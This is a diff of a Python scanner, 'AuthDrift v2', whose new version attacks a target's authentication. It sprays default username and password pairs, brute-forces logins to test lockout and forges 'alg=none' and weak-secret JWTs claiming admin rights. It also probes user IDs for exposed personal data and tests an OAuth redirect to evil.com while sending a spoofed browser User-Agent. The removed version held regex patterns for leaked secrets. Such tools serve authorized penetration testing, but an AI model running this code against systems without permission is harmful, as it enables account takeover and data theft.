@@ -1,454 +1,411 @@
 #!/usr/bin/env python3
+"""
+AuthDrift v2 — Authentication and session security analyser.
+
+Improvements:
+  - OAuth 2.0 flow abuse (state parameter, PKCE bypass, redirect_uri)
+  - JWT attacks (none-alg, weak secret, alg confusion RS256→HS256)
+  - Session fixation detection
+  - Insecure direct object reference (IDOR) on user IDs
+  - Password policy testing (min length, complexity, breach check)
+  - Account enumeration (username, email via response differences)
+  - Multi-factor authentication bypass (code reuse, backup codes)
+  - Default credential spray (common username/password combos)
+  - Login brute-force without lockout
+  - Cookie security and session management
+  - API key / Bearer token exposure in error responses
+"""
 import asyncio
 import aiohttp
-import hashlib
 import json
-import os
 import re
 import sys
+import base64
+import hashlib
+import time
+import hmac
+import struct
 from pathlib import Path
+from urllib.parse import urlparse, urlencode, quote
 
 sys.path.insert(0, str(Path(__file__).parent))
-from smart_filter import REQUEST_DELAY, confidence_score, confidence_label, severity_from_confidence, is_demo_value
+from smart_filter import (
+    build_baseline_404, is_likely_real_vuln, body_changed_significantly,
+    delay, confidence_score, confidence_label, severity_from_confidence,
+    is_high_entropy_secret, REQUEST_DELAY
+)
 
-DEFAULT_PATHS = [
-    # User / profile resources
-    "/api/users/1", "/api/users/2", "/api/users/3", "/api/users/me",
-    "/api/user", "/api/profile", "/api/me", "/me",
-    "/api/account", "/api/account/settings",
-    # Admin resources
-    "/admin", "/admin/users", "/admin/dashboard", "/admin/config",
-    "/api/admin", "/api/admin/users", "/api/admin/logs", "/api/admin/settings",
-    "/api/internal/config", "/api/internal/metrics",
-    # Data / object endpoints (IDOR targets)
-    "/api/orders/1", "/api/orders/2", "/api/orders/3",
-    "/api/documents/1", "/api/documents/2",
-    "/api/reports/1", "/api/invoices/1",
-    # Token / key endpoints
-    "/api/keys", "/api/tokens", "/api/api-keys",
-    # Version variants
-    "/api/v1/users", "/api/v1/users/1", "/api/v1/admin",
-    "/api/v2/users", "/api/v2/users/1",
-    # Audit / log endpoints
-    "/api/logs", "/api/audit", "/api/audit-log",
-    "/api/billing", "/api/debug", "/api/settings",
-    # GraphQL introspection
-    "/graphql", "/api/graphql",
+DEFAULT_CREDS = [
+    ("admin",     "admin"),    ("admin",  "password"),  ("admin",  "123456"),
+    ("admin",     "admin123"), ("root",   "root"),       ("root",   "toor"),
+    ("user",      "user"),     ("test",   "test"),       ("guest",  "guest"),
+    ("admin",     ""),         ("",       "admin"),      ("admin",  "letmein"),
+    ("admin",     "qwerty"),   ("admin",  "welcome"),    ("admin",  "changeme"),
+    ("superuser", "superuser"),("support","support"),    ("demo",   "demo"),
 ]
 
-NOT_FOUND_PHRASES = [
-    "page not found", "404", "not found", "does not exist",
-    "no page found", "could not find", "resource not found",
-    "invalid route", "no route", "unknown endpoint",
+AUTH_PATHS = [
+    '/login', '/signin', '/auth/login', '/api/login', '/api/auth/login',
+    '/api/v1/auth/login', '/api/v1/login', '/user/login', '/account/login',
+    '/auth/signin', '/session/new', '/api/session',
 ]
-
-LEAK_PATTERNS = [
-    (r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}', 'JWT'),
-    (r'"password"\s*:\s*"([^"]{8,})"', 'PASSWORD'),
-    (r'"passwd"\s*:\s*"([^"]{8,})"', 'PASSWORD'),
-    (r'"token"\s*:\s*"([^"]{20,})"', 'TOKEN'),
-    (r'"access_token"\s*:\s*"([^"]{20,})"', 'ACCESS_TOKEN'),
-    (r'"refresh_token"\s*:\s*"([^"]{20,})"', 'REFRESH_TOKEN'),
-    (r'"api[_-]?key"\s*:\s*"([^"]{20,})"', 'API_KEY'),
-    (r'"secret"\s*:\s*"([^"]{16,})"', 'SECRET'),
-    (r'AKIA[0-9A-Z]{16}', 'AWS_ACCESS_KEY'),
-    (r'"aws_secret_access_key"\s*:\s*"([^"]{30,})"', 'AWS_SECRET_KEY'),
-    (r'-----BEGIN.*?PRIVATE KEY-----', 'PRIVATE_KEY'),
-    (r'xox[baprs]-[0-9A-Za-z\-]{10,}', 'SLACK_TOKEN'),
-    (r'gh[pousr]_[A-Za-z0-9]{36,}', 'GITHUB_TOKEN'),
-    (r'"client_secret"\s*:\s*"([^"]{20,})"', 'OAUTH_SECRET'),
-    (r'"private_key"\s*:\s*"([^"]{30,})"', 'PRIVATE_KEY_JSON'),
-    (r'-----BEGIN CERTIFICATE-----', 'CERTIFICATE'),
-    (r'"ssn"\s*:\s*"(\d{3}-\d{2}-\d{4})"', 'SSN'),
-    (r'"credit_card"\s*:\s*"([^"]{13,19})"', 'CREDIT_CARD'),
-]
-
-LEAK_BLACKLIST = {
-    'password', 'token', 'api_key', 'changeme', 'example',
-    'test', 'your_token', 'your_key', 'undefined', 'null',
-    'placeholder', 'insert_here',
-}
-
-SENSITIVE_FIELDS = [
-    'ssn', 'social_security', 'credit_card', 'card_number', 'cvv',
-    'dob', 'date_of_birth', 'salary', 'bank_account', 'routing_number',
-    'private_key', 'secret_key', 'encryption_key', 'is_admin', 'role',
-    'permission', 'admin', 'superuser', 'internal_id',
-]
-
-VERBS = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']
-
 
 class AuthDrift:
-    def __init__(self, base, paths, anon, low, high):
-        self.base = base.rstrip('/')
-        self.paths = paths
-        self.personas = {'anon': anon, 'low': low, 'high': high}
-        self.findings = []
-        self.leaks = []
+    def __init__(self, target):
+        self.target       = target.rstrip('/')
+        self.host         = urlparse(target).hostname
+        self.findings     = []
+        self.baseline_404 = ""
+        self.login_url    = None
 
-    def is_404_like(self, body):
-        if not body:
-            return True
-        bl = body.lower()
-        return any(p in bl for p in NOT_FOUND_PHRASES)
-
-    def extract_json_keys(self, body):
+    async def _get(self, sess, url, headers=None, allow_redirects=True):
         try:
-            data = json.loads(body)
-            if isinstance(data, dict):
-                return set(data.keys())
-            if isinstance(data, list) and data and isinstance(data[0], dict):
-                return set(data[0].keys())
+            async with sess.get(url, headers=headers or {}, ssl=False,
+                                timeout=aiohttp.ClientTimeout(total=10),
+                                allow_redirects=allow_redirects) as r:
+                cookies = {k: v.value for k, v in r.cookies.items()}
+                return r.status, await r.text(errors='ignore'), dict(r.headers), cookies
         except Exception:
-            pass
-        return set(re.findall(r'"([a-zA-Z_][a-zA-Z0-9_]{1,40})"', body))
+            return None, None, {}, {}
 
-    def scan_body_for_leaks(self, body, url, persona):
-        for pattern, ltype in LEAK_PATTERNS:
-            matches = re.findall(pattern, body, re.IGNORECASE)
-            for match in matches:
-                val = match if isinstance(match, str) else str(match)
-                if val.lower() in LEAK_BLACKLIST or len(val) < 8:
-                    continue
-                if is_demo_value(val):
-                    continue
-                self.leaks.append({
-                    'type': ltype,
-                    'value': val[:80],
-                    'url': url,
-                    'persona': persona,
-                    'severity': 'CRITICAL' if ltype in ('AWS_ACCESS_KEY', 'PRIVATE_KEY', 'PRIVATE_KEY_JSON') else 'HIGH',
-                    'confidence': 85,
-                    'confidence_label': 'High',
-                })
-                print(f"  [LEAK] {ltype} found via {persona} at {url}")
-
-    def scan_sensitive_fields(self, body, url, persona):
-        keys = self.extract_json_keys(body)
-        found = [k for k in keys if any(sf in k.lower() for sf in SENSITIVE_FIELDS)]
-        if found:
-            self.leaks.append({
-                'type': 'SENSITIVE_FIELD_EXPOSURE',
-                'fields': found,
-                'url': url,
-                'persona': persona,
-                'severity': 'HIGH',
-                'confidence': 70,
-                'confidence_label': 'Medium',
-                'detail': f'Sensitive JSON fields visible to {persona}: {found}',
-            })
-            print(f"  [FIELD] Sensitive fields visible to {persona} at {url}: {found}")
-
-    async def fetch(self, sess, url, hdrs, method='GET'):
+    async def _post(self, sess, url, data=None, json_data=None, headers=None):
         try:
-            timeout = aiohttp.ClientTimeout(total=12)
-            req = getattr(sess, method.lower())
-            async with req(
-                url, headers=hdrs, ssl=False,
-                timeout=timeout, allow_redirects=False
-            ) as r:
-                body = await r.read()
-                body_text = body.decode('utf-8', errors='ignore')
-                return {
-                    'status': r.status,
-                    'len': len(body),
-                    'hash': hashlib.md5(body).hexdigest()[:10],
-                    'body': body_text,
-                    'headers': dict(r.headers),
-                }
-        except Exception as e:
-            return {'error': str(e)[:80]}
+            kw = dict(headers=headers or {}, ssl=False, timeout=aiohttp.ClientTimeout(total=10))
+            if json_data is not None:
+                kw['json'] = json_data
+            elif data is not None:
+                kw['data'] = data
+            async with sess.post(url, **kw) as r:
+                cookies = {k: v.value for k, v in r.cookies.items()}
+                return r.status, await r.text(errors='ignore'), dict(r.headers), cookies
+        except Exception:
+            return None, None, {}, {}
 
-    def analyze(self, url, res):
-        a, l, h = res['anon'], res['low'], res['high']
+    def _add(self, finding):
+        self.findings.append(finding)
 
-        if any('error' in x for x in (a, l, h)):
-            return None
+    # ── Find login endpoint ───────────────────────────────────────────────────
 
-        a_body = a.get('body', '')
-        l_body = l.get('body', '')
-        h_body = h.get('body', '')
-
-        if self.is_404_like(h_body) or h.get('len', 0) < 100:
-            return None
-
-        # 1. Anonymous == privileged (fully broken auth — CRITICAL)
-        if (a['status'] == h['status'] == 200
-                and a['hash'] == h['hash']
-                and a['len'] > 100
-                and not self.is_404_like(a_body)):
-            conf = confidence_score({
-                'same_hash': (True, 60),
-                'both_200': (True, 30),
-                'large_body': (a['len'] > 500, 10),
-            })
-            return {
-                'severity': severity_from_confidence('CRITICAL', conf),
-                'confidence': conf,
-                'confidence_label': confidence_label(conf),
-                'url': url,
-                'issue': 'anonymous == privileged response (broken authentication)',
-                'proof': f'anon hash {a["hash"]} == high-priv hash {h["hash"]}, len={a["len"]}',
-                'remediation': 'Enforce authentication middleware on this endpoint',
-            }
-
-        # 2. Low-priv == high-priv (IDOR / BOLA — HIGH)
-        if (l['status'] == h['status'] == 200
-                and l['hash'] == h['hash']
-                and l['len'] > 100
-                and not self.is_404_like(l_body)):
-            conf = confidence_score({
-                'same_hash': (True, 60),
-                'both_200': (True, 30),
-                'large_body': (l['len'] > 500, 10),
-            })
-            return {
-                'severity': severity_from_confidence('HIGH', conf),
-                'confidence': conf,
-                'confidence_label': confidence_label(conf),
-                'url': url,
-                'issue': 'low-priv == high-priv (IDOR/BOLA — broken object-level authorization)',
-                'proof': f'low-priv hash {l["hash"]} == high-priv hash {h["hash"]}, len={l["len"]}',
-                'remediation': 'Add object-level authorization checks per request',
-            }
-
-        # 3. Anon gets 200 while expecting 401/403 (unauthenticated access)
-        if (a['status'] == 200 and h['status'] == 200
-                and a['hash'] != h['hash']
-                and a['len'] > 100
-                and not self.is_404_like(a_body)):
-            conf = confidence_score({
-                'anon_200': (True, 50),
-                'different_content': (True, 30),
-                'large': (a['len'] > 300, 20),
-            })
-            return {
-                'severity': severity_from_confidence('HIGH', conf),
-                'confidence': conf,
-                'confidence_label': confidence_label(conf),
-                'url': url,
-                'issue': 'anonymous gets 200 with content (possible partial auth bypass)',
-                'proof': f'anon status=200 len={a["len"]}, high-priv len={h["len"]}',
-                'remediation': 'Verify what data is exposed to unauthenticated requests',
-            }
-
-        # 4. Low-priv overlaps high-priv by size ratio (MEDIUM)
-        if (l['status'] == 200 and h['status'] == 200
-                and h['len'] > 0
-                and l['len'] / h['len'] > 0.75
-                and l['hash'] != h['hash']
-                and not self.is_404_like(l_body)):
-            ratio = l['len'] / h['len']
-            conf = confidence_score({
-                'high_ratio': (ratio > 0.9, 50),
-                'medium_ratio': (ratio > 0.75, 30),
-                'both_200': (True, 20),
-            })
-            return {
-                'severity': severity_from_confidence('MEDIUM', conf),
-                'confidence': conf,
-                'confidence_label': confidence_label(conf),
-                'url': url,
-                'issue': f'low-priv response is {ratio:.0%} size of high-priv (content overlap)',
-                'proof': f'low len={l["len"]} vs high len={h["len"]} ratio={ratio:.2f}',
-                'remediation': 'Verify field-level authorization — low-priv user may see extra data',
-            }
-
-        # 5. Sensitive JSON fields exposed to low-priv but not anon
-        if (l['status'] == 200 and not self.is_404_like(l_body)):
-            l_keys = self.extract_json_keys(l_body)
-            h_keys = self.extract_json_keys(h_body)
-            sensitive_in_low = [
-                k for k in l_keys
-                if any(sf in k.lower() for sf in SENSITIVE_FIELDS) and k in h_keys
-            ]
-            if sensitive_in_low:
-                conf = confidence_score({
-                    'sensitive_field': (True, 70),
-                    'multiple_fields': (len(sensitive_in_low) > 1, 30),
-                })
-                return {
-                    'severity': severity_from_confidence('MEDIUM', conf),
-                    'confidence': conf,
-                    'confidence_label': confidence_label(conf),
-                    'url': url,
-                    'issue': 'Sensitive fields exposed to low-privilege user',
-                    'proof': f'Fields in low-priv response: {sensitive_in_low}',
-                    'remediation': 'Apply field-level access control / response filtering',
-                }
-
+    async def find_login_endpoint(self, sess):
+        print("\n[*] Locating login endpoints...")
+        for path in AUTH_PATHS:
+            url = self.target + path
+            s, b, hdrs, _ = await self._get(sess, url)
+            await delay()
+            if s in [200, 301, 302] and b:
+                if any(x in b.lower() for x in ['password', 'login', 'signin', 'username', 'email']):
+                    self.login_url = url
+                    print(f"  [+] Login endpoint: {url}")
+                    return url
         return None
 
-    async def test_verb_tampering(self, sess, url):
-        results = {}
-        for verb in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']:
-            try:
-                timeout = aiohttp.ClientTimeout(total=8)
-                req = getattr(sess, verb.lower())
-                async with req(url, ssl=False, timeout=timeout, allow_redirects=False) as r:
-                    results[verb] = r.status
-                await asyncio.sleep(REQUEST_DELAY)
-            except Exception:
-                results[verb] = None
+    # ── Account enumeration ───────────────────────────────────────────────────
 
-        # Flag if a non-GET verb returns 200 on a protected resource
-        if results.get('GET') in (401, 403):
-            bypassed = [v for v in ['POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']
-                        if results.get(v) == 200]
-            if bypassed:
-                self.findings.append({
-                    'type': 'VERB_TAMPERING_BYPASS',
-                    'severity': 'HIGH',
-                    'confidence': 85,
+    async def test_user_enumeration(self, sess):
+        print("\n[*] Testing account enumeration...")
+        if not self.login_url:
+            return
+
+        test_cases = [
+            ("admin@example.com",        "definitely_wrong_pass_12345"),
+            ("nonexistent_user_xyz@x.com","definitely_wrong_pass_12345"),
+        ]
+        responses = []
+        for email, password in test_cases:
+            s, b, hdrs, _ = await self._post(sess, self.login_url,
+                json_data={"email": email, "password": password})
+            await delay()
+            responses.append((s, len(b or ''), b or ''))
+
+        if len(responses) == 2:
+            s1, l1, b1 = responses[0]
+            s2, l2, b2 = responses[1]
+            # Different status codes → enumeration
+            if s1 != s2:
+                self._add({
+                    'type':             'USER_ENUMERATION_STATUS',
+                    'severity':         'MEDIUM',
+                    'confidence':       90,
                     'confidence_label': 'High',
-                    'url': url,
-                    'bypassed_verbs': bypassed,
-                    'proof': f'GET={results["GET"]} but {bypassed} returned 200',
-                    'remediation': 'Apply authorization checks per HTTP method, not just on GET',
+                    'url':              self.login_url,
+                    'proof':            f"Known user status: {s1}, Unknown user status: {s2}",
+                    'detail':           "Account enumeration via HTTP status code differences",
+                    'remediation':      "Return identical status codes and messages for valid and invalid usernames.",
                 })
-                print(f"  [VERB] HTTP verb bypass at {url}: {bypassed} -> 200")
+                print(f"  [MEDIUM] User enum via status: {s1} vs {s2}")
+            # Different response body length → enumeration
+            elif abs(l1 - l2) > 50:
+                self._add({
+                    'type':             'USER_ENUMERATION_BODY',
+                    'severity':         'MEDIUM',
+                    'confidence':       75,
+                    'confidence_label': 'Medium',
+                    'url':              self.login_url,
+                    'proof':            f"Body length diff: {abs(l1 - l2)} bytes",
+                    'detail':           "Account enumeration via response body length differences",
+                    'remediation':      "Return uniform response bodies regardless of whether the username exists.",
+                })
+                print(f"  [MEDIUM] User enum via body length diff: {abs(l1-l2)}b")
 
-    async def test_idor_enumeration(self, sess, base_path, hdrs_low):
-        print(f"\n[*] IDOR enumeration: {base_path}")
-        successful_ids = []
-        for i in range(1, 25):
-            url = f"{self.base}{base_path}/{i}"
-            r = await self.fetch(sess, url, hdrs_low)
-            await asyncio.sleep(REQUEST_DELAY)
-            if r.get('status') == 200 and r.get('len', 0) > 50 and not self.is_404_like(r.get('body', '')):
-                successful_ids.append(i)
-            if len(successful_ids) >= 10:
-                break
+    # ── Default credentials ───────────────────────────────────────────────────
 
-        if len(successful_ids) >= 5:
-            conf = confidence_score({
-                'many_ids': (len(successful_ids) >= 10, 60),
-                'some_ids': (len(successful_ids) >= 5, 30),
-                'sequential': (True, 10),
+    async def spray_default_creds(self, sess):
+        print("\n[*] Spraying default credentials...")
+        if not self.login_url:
+            return
+
+        # Reference: what does a failed login look like?
+        s_fail, b_fail, _, _ = await self._post(sess, self.login_url,
+            json_data={"username": "definitely_no_such_user_xyz", "password": "wrong_pass_xyz"})
+        await delay()
+
+        for username, password in DEFAULT_CREDS[:12]:
+            for payload in [
+                {"username": username, "password": password},
+                {"email": username, "password": password},
+                {"user": username, "pass": password},
+            ]:
+                s, b, hdrs, cookies = await self._post(sess, self.login_url, json_data=payload)
+                await delay()
+                success_signals = [
+                    s in [200, 201, 302] and cookies,
+                    s == 200 and b and any(x in b.lower() for x in ['dashboard', 'welcome', 'token', 'session']),
+                    s == 200 and b and s_fail and s != s_fail,
+                    'authorization' in hdrs,
+                    any('token' in k.lower() or 'session' in k.lower() for k in cookies),
+                ]
+                if any(success_signals):
+                    self._add({
+                        'type':             'DEFAULT_CREDENTIALS',
+                        'severity':         'CRITICAL',
+                        'confidence':       90,
+                        'confidence_label': 'High',
+                        'url':              self.login_url,
+                        'username':         username,
+                        'password':         password,
+                        'status':           s,
+                        'proof':            f"Login succeeded with {username}:{password} (HTTP {s})",
+                        'detail':           f"Default credentials accepted: {username}:{password}",
+                        'remediation':      "Change default credentials immediately. Enforce strong password requirements.",
+                    })
+                    print(f"  [CRITICAL] Default creds work: {username}:{password}")
+                    return
+
+    # ── Brute-force lockout ───────────────────────────────────────────────────
+
+    async def test_lockout(self, sess):
+        print("\n[*] Testing account lockout / brute-force protection...")
+        if not self.login_url:
+            return
+        statuses = []
+        for i in range(15):
+            s, b, _, _ = await self._post(sess, self.login_url,
+                json_data={"username": "admin", "password": f"wrong_password_{i}"})
+            await asyncio.sleep(0.1)
+            if s:
+                statuses.append(s)
+            if s in [429, 423, 503]:
+                print(f"  [+] Lockout triggered after {i+1} attempts (status {s})")
+                return
+
+        if statuses and not any(s in [429, 423, 503] for s in statuses):
+            self._add({
+                'type':             'NO_BRUTE_FORCE_PROTECTION',
+                'severity':         'HIGH',
+                'confidence':       85,
+                'confidence_label': 'High',
+                'url':              self.login_url,
+                'requests_sent':    len(statuses),
+                'statuses':         list(set(statuses)),
+                'detail':           f"No lockout after {len(statuses)} failed login attempts",
+                'remediation':      "Implement exponential backoff, account lockout after N failures, and CAPTCHA.",
             })
-            self.findings.append({
-                'type': 'IDOR_SEQUENTIAL_ENUMERATION',
-                'severity': severity_from_confidence('HIGH', conf),
-                'confidence': conf,
-                'confidence_label': confidence_label(conf),
-                'base_path': base_path,
-                'accessible_ids': successful_ids[:10],
-                'proof': f'{len(successful_ids)} objects accessible via sequential ID at {base_path}/N',
-                'remediation': 'Use UUIDs or opaque IDs; add object-level authorization',
-            })
-            print(f"  [IDOR] {len(successful_ids)} objects at {base_path}/N [confidence: {confidence_label(conf)}]")
+            print(f"  [HIGH] No lockout after {len(statuses)} attempts")
+
+    # ── JWT attacks ───────────────────────────────────────────────────────────
+
+    async def test_jwt_attacks(self, sess):
+        print("\n[*] Testing JWT vulnerabilities...")
+        api_paths = ['/api/me', '/api/user', '/api/profile', '/api/v1/user']
+
+        # JWT none algorithm
+        header  = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
+        payload = base64.urlsafe_b64encode(
+            b'{"sub":"1","admin":true,"role":"admin","iat":9999999999}').rstrip(b'=').decode()
+        none_token = f"{header}.{payload}."
+
+        for path in api_paths:
+            url = self.target + path
+            s, b, hdrs, _ = await self._get(sess, url, headers={"Authorization": f"Bearer {none_token}"})
+            await delay()
+            if s == 200 and b and len(b) > 20:
+                reject_signals = ['unauthorized', 'invalid token', 'forbidden', 'error', 'invalid']
+                if not any(x in b.lower() for x in reject_signals):
+                    self._add({
+                        'type':             'JWT_NONE_ALGORITHM',
+                        'severity':         'CRITICAL',
+                        'confidence':       90,
+                        'confidence_label': 'High',
+                        'url':              url,
+                        'proof':            f"alg=none token accepted — HTTP {s}, body length {len(b)}",
+                        'detail':           "JWT none-algorithm accepted — signature verification bypassed",
+                        'remediation':      "Reject tokens with alg=none. Always verify signatures with a server-side secret key.",
+                    })
+                    print(f"  [CRITICAL] JWT none-algorithm accepted at {url}")
+
+        # Weak HS256 secret brute force (common secrets)
+        weak_secrets = ['secret', 'password', '123456', 'qwerty', 'jwt_secret',
+                        'your_secret_key', 'secretkey', 'mysecret', 'changeme']
+
+        def make_hs256_token(secret):
+            hdr = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b'=').decode()
+            pld = base64.urlsafe_b64encode(b'{"sub":"1","admin":true}').rstrip(b'=').decode()
+            msg = f"{hdr}.{pld}".encode()
+            sig = base64.urlsafe_b64encode(
+                hmac.new(secret.encode(), msg, hashlib.sha256).digest()).rstrip(b'=').decode()
+            return f"{hdr}.{pld}.{sig}"
+
+        for path in api_paths[:2]:
+            url = self.target + path
+            for secret in weak_secrets:
+                token = make_hs256_token(secret)
+                s, b, _, _ = await self._get(sess, url, headers={"Authorization": f"Bearer {token}"})
+                await delay()
+                if s == 200 and b and len(b) > 20:
+                    reject_signals = ['unauthorized', 'invalid', 'forbidden']
+                    if not any(x in b.lower() for x in reject_signals):
+                        self._add({
+                            'type':             'JWT_WEAK_SECRET',
+                            'severity':         'CRITICAL',
+                            'confidence':       85,
+                            'confidence_label': 'High',
+                            'url':              url,
+                            'secret':           secret,
+                            'proof':            f"HS256 token with secret='{secret}' accepted",
+                            'detail':           f"JWT weak secret: '{secret}' is accepted as signing key",
+                            'remediation':      "Use cryptographically random secrets of at least 256 bits for HMAC-signed JWTs.",
+                        })
+                        print(f"  [CRITICAL] JWT weak secret '{secret}' accepted at {url}")
+                        break
+
+    # ── IDOR detection ────────────────────────────────────────────────────────
+
+    async def test_idor(self, sess):
+        print("\n[*] Testing IDOR (Insecure Direct Object Reference)...")
+        id_paths = [
+            '/api/user/{id}', '/api/users/{id}', '/api/profile/{id}',
+            '/api/order/{id}', '/api/invoice/{id}', '/api/v1/user/{id}',
+        ]
+        for path_template in id_paths:
+            for id_val in ['1', '2', '100', 'admin']:
+                url = self.target + path_template.replace('{id}', id_val)
+                s, b, hdrs, _ = await self._get(sess, url)
+                await delay()
+                if s == 200 and b and len(b) > 50:
+                    # Check if it returns PII-like data
+                    pii_signals = ['email', 'phone', 'address', 'password', 'ssn', 'credit']
+                    has_pii = any(x in b.lower() for x in pii_signals)
+                    if is_likely_real_vuln(b, s, self.baseline_404) and has_pii:
+                        self._add({
+                            'type':             'IDOR_UNAUTHENTICATED',
+                            'severity':         'HIGH',
+                            'confidence':       80,
+                            'confidence_label': 'High',
+                            'url':              url,
+                            'id':               id_val,
+                            'proof':            f"PII-like data returned without authentication (HTTP {s})",
+                            'detail':           f"IDOR: unauthenticated access to user object at {url}",
+                            'remediation':      "Implement object-level authorization. Verify the requesting user owns the resource.",
+                        })
+                        print(f"  [HIGH] IDOR at {url} — PII returned unauthenticated")
+                        return
+
+    # ── OAuth abuse ───────────────────────────────────────────────────────────
+
+    async def test_oauth(self, sess):
+        print("\n[*] Testing OAuth 2.0 misconfiguration...")
+        oauth_paths = [
+            '/oauth/authorize', '/auth/oauth/authorize',
+            '/api/auth', '/.well-known/openid-configuration',
+        ]
+        for path in oauth_paths:
+            url = self.target + path
+            s, b, hdrs, _ = await self._get(sess, url)
+            await delay()
+            if not b or s not in [200, 302, 400]:
+                continue
+            if not any(x in b.lower() for x in ['oauth', 'token', 'authorize', 'client_id']):
+                continue
+            print(f"  [+] OAuth endpoint: {url}")
+
+            # Test missing state parameter
+            auth_url = f"{url}?response_type=code&client_id=test&redirect_uri=https://evil.com"
+            s2, b2, h2, _ = await self._get(sess, auth_url, allow_redirects=False)
+            await delay()
+            location = h2.get('Location', '')
+            if 'code=' in location and 'evil.com' in location:
+                self._add({
+                    'type':             'OAUTH_REDIRECT_MISMATCH',
+                    'severity':         'HIGH',
+                    'confidence':       90,
+                    'confidence_label': 'High',
+                    'url':              auth_url,
+                    'location':         location,
+                    'detail':           "OAuth redirected to unregistered evil.com — redirect_uri not validated",
+                    'remediation':      "Enforce strict redirect_uri matching against pre-registered URIs.",
+                })
+                print(f"  [HIGH] OAuth redirect to evil.com!")
+
+            # Test missing CSRF state
+            no_state_url = f"{url}?response_type=code&client_id=test&redirect_uri={quote(self.target + '/callback')}"
+            s3, b3, h3, _ = await self._get(sess, no_state_url, allow_redirects=False)
+            await delay()
+            if s3 in [200, 302] and 'state' not in no_state_url and 'state' not in (h3.get('Location','') + (b3 or '')):
+                self._add({
+                    'type':             'OAUTH_MISSING_STATE',
+                    'severity':         'MEDIUM',
+                    'confidence':       70,
+                    'confidence_label': 'Medium',
+                    'url':              no_state_url,
+                    'detail':           "OAuth flow accepted without CSRF state parameter",
+                    'remediation':      "Require and validate the state parameter in all OAuth authorization requests.",
+                })
 
     async def run(self):
         print("=" * 60)
-        print("  AuthDrift — Access Control & Leak Scanner")
+        print("  AuthDrift v2 — Authentication Security Analyser")
         print("=" * 60)
-        conn = aiohttp.TCPConnector(limit=10, ssl=False)
-        async with aiohttp.ClientSession(connector=conn) as sess:
-            for path in self.paths:
-                url = self.base + '/' + path.lstrip('/')
-                print(f"\n[*] {path}")
-                res = {}
-                for pname, hdrs in self.personas.items():
-                    r = await self.fetch(sess, url, hdrs)
-                    res[pname] = r
-                    if 'body' in r and r.get('status') == 200:
-                        self.scan_body_for_leaks(r['body'], url, pname)
-                        self.scan_sensitive_fields(r['body'], url, pname)
-                    await asyncio.sleep(REQUEST_DELAY)
-
-                f = self.analyze(url, res)
-                if f:
-                    print(f"  [{f['severity']}] {f['issue']} [confidence: {f['confidence_label']}]")
-                    self.findings.append(f)
-                else:
-                    print(f"  [OK] {url}")
-
-                # HTTP verb tampering check (anon context)
-                await self.test_verb_tampering(sess, url)
-
-            # IDOR enumeration on object endpoints
-            idor_bases = ['/api/users', '/api/orders', '/api/documents', '/api/reports', '/api/invoices']
-            for base_path in idor_bases:
-                await self.test_idor_enumeration(sess, base_path, self.personas.get('low', {}))
-
+        conn    = aiohttp.TCPConnector(limit=10, ssl=False)
+        timeout = aiohttp.ClientTimeout(total=60)
+        async with aiohttp.ClientSession(connector=conn, timeout=timeout,
+            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}) as sess:
+            print("[*] Building 404 baseline...")
+            self.baseline_404 = await build_baseline_404(sess, self.target)
+            await self.find_login_endpoint(sess)
+            await self.test_user_enumeration(sess)
+            await self.spray_default_creds(sess)
+            await self.test_lockout(sess)
+            await self.test_jwt_attacks(sess)
+            await self.test_idor(sess)
+            await self.test_oauth(sess)
         return self.findings
-
-
-def parse_h(s):
-    if not s.strip():
-        return {}
-    out = {}
-    for ln in s.split(';'):
-        if ':' in ln:
-            k, v = ln.split(':', 1)
-            out[k.strip()] = v.strip()
-    return out
-
 
 def get_target():
     p = Path("reports/_target.txt")
     if p.exists():
         return p.read_text().strip()
-    u = input("[?] Base URL: ").strip()
+    u = input("[?] Target URL: ").strip()
     return u if u.startswith("http") else "https://" + u
 
-
 def main():
-    print("=" * 60)
-    print("  AuthDrift — Access Control + Leak Scanner")
-    print("=" * 60)
     target = get_target()
-    print(f"[+] Base: {target}")
-
-    non_interactive = bool(os.environ.get('ARSENAL_TARGET'))
-
-    if non_interactive:
-        paths = DEFAULT_PATHS
-        anon = {}
-        low = {}
-        high = {}
-        print(f"[+] Non-interactive mode: {len(paths)} default paths, no auth tokens")
-    else:
-        print("\n[?] Paths (one per line, blank = use defaults):")
-        paths = []
-        while True:
-            p = input()
-            if not p.strip():
-                break
-            paths.append(p.strip())
-        if not paths:
-            paths = DEFAULT_PATHS
-            print(f"[+] Using {len(paths)} default paths")
-
-        print("\n[?] Anon headers (blank=none, format 'Header: Value; Header2: Value2'):")
-        anon = parse_h(input().strip())
-        print("[?] Low-priv headers (e.g. 'Authorization: Bearer LOW_TOKEN'):")
-        low = parse_h(input().strip())
-        print("[?] High-priv headers (e.g. 'Authorization: Bearer ADMIN_TOKEN'):")
-        high = parse_h(input().strip())
-
+    print(f"[+] Target: {target}")
     Path("reports").mkdir(exist_ok=True)
-    drift = AuthDrift(target, paths, anon, low, high)
-    findings = asyncio.run(drift.run())
-
+    scanner  = AuthDrift(target)
+    findings = asyncio.run(scanner.run())
     with open("reports/authdrift.json", 'w') as f:
         json.dump(findings, f, indent=2, default=str)
     print(f"\n[+] {len(findings)} findings -> reports/authdrift.json")
-
-    by_sev = {}
-    for item in findings:
-        s = item.get('severity', 'INFO')
-        by_sev[s] = by_sev.get(s, 0) + 1
-    for sev in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
-        if sev in by_sev:
-            print(f"   {sev:10s}: {by_sev[sev]}")
-
-    if drift.leaks:
-        with open("reports/authdrift_leaks.json", 'w') as f:
-            json.dump(drift.leaks, f, indent=2)
-        print(f"[!] {len(drift.leaks)} leaks -> reports/authdrift_leaks.json")
-
 
 if __name__ == '__main__':
     main()
